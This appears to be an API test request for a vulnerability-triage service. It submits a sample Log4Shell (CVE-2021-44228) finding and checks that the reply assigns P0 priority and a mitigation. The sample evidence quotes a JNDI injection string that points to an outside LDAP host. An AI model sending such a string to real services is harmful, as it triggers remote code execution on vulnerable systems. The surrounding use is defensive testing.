$kind: http-request
url: "{{baseUrl}}/api/analyze-custom"
method: POST
headers:
  Content-Type: application/json
body:
  type: text
  content: |-
    {
      "title": "Log4j Remote Code Execution (Log4Shell)",
      "category": "CVE",
      "severity": "CRITICAL",
      "cve_id": "CVE-2021-44228",
      "cvss_score": 10.0,
      "asset": "auth-service-prod.internal.corp",
      "endpoint": "POST /api/v1/auth/login",
      "component": "org.apache.logging.log4j:log4j-core:2.14.1",
      "evidence": {
        "attack_vector": "User-Agent header contained '${jndi:ldap://198.51.100.24:1389/Exploit}'",
        "egress_firewall_log": "Blocked outbound connection to 198.51.100.24:1389 from 10.0.4.12",
        "runtime_classpath": "log4j-core-2.14.1.jar"
      },
      "description": "Critical zero-day Log4Shell JNDI injection attempted on production authentication pod."
    }
scripts:
  - type: afterResponse
    code: |-
      pm.test("Status code is 200", () => pm.response.to.have.status(200));
      const res = pm.response.json();
      pm.test("Priority is P0 for Critical CVE", () => {
          pm.expect(res.analysis.suggested_priority).to.equal("P0 - Critical");
      });
      pm.test("Contains immediate WAF / JVM mitigation", () => {
          pm.expect(res.analysis.recommended_remediation.immediate_mitigation.length).to.be.above(20);
      });
    language: text/javascript
order: 2000
